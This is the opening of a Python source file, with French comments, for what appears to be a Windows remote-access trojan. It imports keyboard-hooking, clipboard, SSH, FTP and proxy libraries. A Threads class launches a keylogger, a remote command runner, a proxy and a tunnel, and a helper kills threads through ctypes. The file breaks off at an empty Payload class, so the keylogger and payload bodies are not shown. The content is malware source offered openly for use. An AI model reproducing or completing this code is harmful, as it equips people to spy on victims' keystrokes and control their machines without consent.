import socket
import os
import subprocess
from ctypes import *
import pythoncom
import pyHook
import ctypes
import win32clipboard
# import win32gui
from win32com.makegw.makegwparse import *
import threading
import inspect
import sys
import time
import random
import string
from ftplib import FTP
import asyncio
import pproxy
import getpass
import select
from optparse import OptionParser
import paramiko

# pour la compil
import imp

def get_or_create_eventloop():
    try:
        return asyncio.get_event_loop()
    except RuntimeError as ex:
        if "There is no current event loop in thread" in str(ex):
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            return asyncio.get_event_loop()

def getString(length=6):
    """Générer une chaîne aléatoire de longueur fixe"""
    str = string.ascii_lowercase
    return ''.join(random.choice(str) for i in range(length))

def _async_raise(tid, exctype):
    """raises the exception, performs cleanup if needed"""
    tid = ctypes.c_long(tid)
    if not inspect.isclass(exctype):
        exctype = type(exctype)
    res = ctypes.pythonapi.PyThreadState_SetAsyncExc(
        tid, ctypes.py_object(exctype))
    if res == 0:
        raise ValueError("invalid thread id")
    elif res != 1:
        # """if it returns a number greater than one, you're in trouble,
        # and you should call it again with exc=NULL to revert the effect"""
        ctypes.pythonapi.PyThreadState_SetAsyncExc(tid, None)
        raise SystemError("PyThreadState_SetAsyncExc failed")


class Threads:

    thread_id = 0
    thread_name = "null"

    def StartThread(self, fonction, arg1="", arg2=""):
        if "Keylogger" in fonction:
            thread = threading.Thread(target=keylog.Keylog, name=fonction)
            thread.start()
        if "Commande" in fonction:
            thread = threading.Thread(
                target=payload.Commande, name=fonction, args=(arg1,))
            thread.start()
        if "Proxy" in fonction:
            thread = threading.Thread(
                target=payload.StartProxy, name=fonction, args=(arg1,))
            thread.start()
        if "Tunnel" in fonction:
            thread = threading.Thread(
                target=payload.StartTunnel, name=fonction, args=(arg1,arg2))
            thread.start()
        self.thread_id = thread.ident
        self.thread_name = thread.name
        

    def StopThread(self):
        print("Arret du Thread : " + self.thread_name +
              ", numéro : " + str(self.thread_id))
        _async_raise(self.thread_id, SystemExit)


class Payload:
